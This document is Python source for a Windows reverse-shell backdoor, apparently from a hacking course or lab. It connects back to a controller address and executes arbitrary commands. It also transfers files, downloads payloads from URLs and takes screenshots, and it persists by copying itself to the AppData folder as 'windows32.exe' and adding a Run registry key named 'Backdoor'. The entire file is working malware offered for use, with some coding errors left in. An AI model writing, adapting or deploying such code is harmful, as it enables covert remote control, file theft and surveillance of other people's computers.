#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue
def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join[os.environ.get('SystemRoot','C:\windows'), 'temp'])
    except:
        admin = "[!!] User privileges!"
    else:
        admin = "[+] Administration privileges!"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_response = request.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("10.0.2.15",54321))#Change to Server IP
            shell()
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command == "help":
            help_options = '''
            download path --> Download a file from target pc
            upload --> Upload a file to target pc
            get url --> Download a file to target pc from any website
            start path --> Srart a program on target pc
            screenshot --> take a screenshot of targets monitor
            check --> check privileges
            q --> Exit reverse shell
            '''
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb"):
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = reliable_recv()
                fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded file from specified URL!")
            except:
                reliable_send("[-] Failed to download that file")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take screenshot")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[!!] Failed to start")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Cant perform the check")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"'+ location +'"', shell=True)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()

sock.close()
